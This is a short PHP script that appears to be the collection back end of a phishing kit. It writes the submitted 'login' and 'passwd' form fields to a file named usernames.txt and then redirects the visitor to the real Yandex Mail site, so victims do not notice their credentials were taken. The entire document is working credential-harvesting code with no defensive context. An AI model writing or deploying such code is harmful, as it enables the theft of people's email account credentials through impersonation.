<?php

file_put_contents("usernames.txt", "Username: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://mail.yandex.com/');
exit();
